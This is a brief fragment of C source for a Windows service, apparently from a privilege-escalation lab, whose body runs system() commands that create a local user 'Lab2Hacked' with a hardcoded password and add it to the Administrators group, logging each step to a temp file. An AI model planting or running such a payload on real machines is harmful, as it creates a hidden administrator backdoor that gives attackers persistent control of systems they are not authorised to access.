	...
	if (MyServiceStatusHandle != 0)
	{
		...
		if (SetServiceStatus(MyServiceStatusHandle, &MyServiceStatus))
		{
			...
			if (SetServiceStatus(MyServiceStatusHandle, &MyServiceStatus))
			{
				...
				system("echo 'Running: net user Lab2Hacked QAZwsx12+1 /add' >> \"c:\\temp\\bang.txt\"");
				system("net user Lab2Hacked QAZwsx12+1 /add");
				system("echo 'Running: adding user Lab2Hacked to localadministrators' >> \"c:\\temp\\bang.txt\"");
				system("net localgroup administrators Lab2Hacked /add");
